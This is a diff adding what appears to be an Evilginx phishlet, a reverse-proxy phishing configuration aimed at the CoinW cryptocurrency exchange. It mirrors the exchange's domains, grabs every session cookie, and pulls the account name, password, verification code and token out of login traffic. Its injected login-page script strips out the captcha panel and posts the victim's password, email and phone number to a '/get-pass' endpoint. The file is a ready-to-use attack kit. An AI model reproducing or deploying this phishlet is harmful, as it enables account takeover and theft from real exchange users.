@@ -1,0 +1,99 @@
+author: '@Evi1Grey5'
+min_ver: '3.0.0'
+
+
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'coinw.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'coinw.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'hkprod', orig_sub: 'hkprod', domain: 'hkoss8976.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'lf1-cdn-tos', orig_sub: 'lf1-cdn-tos', domain: 'bytegoofy.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'hkto-prod.oss-accelerate', orig_sub: 'hkto-prod.oss-accelerate', domain: 'aliyuncs.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'gcaptcha4', orig_sub: 'gcaptcha4', domain: 'geetest.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'geetest.com', session: true, is_landing: false, auto_filter: false}
+
+
+
+sub_filters:
+  - {triggers_on: '', orig_sub: '', domain: 'coinw.com', search: 'https://{hostname}', replace: 'https://{hostname_regexp}', mimes: ['application/json', 'text/plain', 'application/xhtml+xml', 'application/xml', 'image/avif', 'image/webp', 'image/apng', 'application/javascript','application/signed-exchange']}
+  - {triggers_on: 'www', orig_sub: 'www', domain: 'coinw.com', search: 'https://{hostname}', replace: 'https://{hostname_regexp}', mimes: ['application/json', 'text/plain', 'application/xhtml+xml', 'application/xml', 'image/avif', 'image/webp', 'image/apng', 'application/javascript']}
+  - {triggers_on: 'hkprod.hkoss8976.com', orig_sub: 'hkprod', domain: 'hkoss8976.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['application/json', 'text/plain', 'application/xhtml+xml', 'application/xml', 'image/avif', 'image/webp', 'image/apng', 'application/javascript']}
+  - {triggers_on: 'lf1-cdn-tos.bytegoofy.com', orig_sub: 'lf1-cdn-tos', domain: 'bytegoofy.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['application/json', 'text/plain', 'application/xhtml+xml', 'application/xml', 'image/avif', 'image/webp', 'image/apng', 'application/javascript']}
+  - {triggers_on: 'gcaptcha4.geetest.com', orig_sub: 'gcaptcha4', domain: 'geetest.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['application/json', 'text/plain', 'application/xhtml+xml', 'application/xml', 'image/avif', 'image/webp', 'image/apng', 'application/javascript']}
+  - {triggers_on: 'hkto-prod.oss-accelerate.aliyuncs.com', orig_sub: 'hkto-prod.oss-accelerate', domain: 'aliyuncs.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['application/json', 'text/plain', 'application/xhtml+xml', 'application/xml', 'image/avif', 'image/webp', 'image/apng', 'application/javascript']}
+
+
+auth_tokens:
+  - domain: 'coinw.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+  - domain: 'www.coinw.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+
+
+auth_urls:
+  - '/wallet'
+  - '/'
+
+
+
+credentials:
+  username:
+    key: ''
+    search: '"account":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"password":"([^"]*)'
+    type: 'json'
+  custom:
+    key: ''
+    search: '"verifyCode":"([^"]*)'
+    type: 'json'
+  custom:
+    key: ''
+    search: '"token":"([^"]*)'
+    type: 'json'
+
+#username:loginName
+#custom:areaCode/country
+
+
+login:
+  domain: 'coinw.com'
+  path: '/login?redirectUrl=%2F'
+
+js_inject:
+  - trigger_domains: ["coinw.com"]
+    trigger_paths: ["/login?redirectUrl=%2F","/login*"]
+    trigger_params: []
+    script: |
+      function lp(){
+        var submit = document.querySelectorAll('button[type=submit]')[0];
+        submit.setAttribute("onclick", "send_email(); send_mobile();");
+        var elem1 = document.getElementsByClassName("geetest_panel geetest_wind")[0];
+        elem1.parentNode.removeChild(elem1);
+        return;
+      }
+      function send_email(){
+        var password = document.getElementsByName("password")[0].value;
+        var email = document.getElementsByName("email")[0].value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/get-pass', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("leaked_password="+encodeURIComponent(password)+" &"+" leaked_email="+encodeURIComponent(email));
+        var elem1 = document.getElementsByClassName("geetest_panel geetest_wind")[0];
+        elem1.parentNode.removeChild(elem1);
+        return;
+      }
+      function send_mobile(){
+        var password = document.getElementsByName("password")[0].value;
+        var mobileCountry = document.getElementsByClassName("css-167bcsx")[0].value;
+        var mobileNumber = document.getElementsByName("mobile")[0].value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/get-pass', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("leaked_password="+encodeURIComponent(password)+" &"+" mobileCode="+encodeURIComponent(mobileCountry)+" &"+" mobile="+encodeURIComponent(mobileNumber));
+        return;
+      }
+      setTimeout(function(){ lp(); }, 4000);
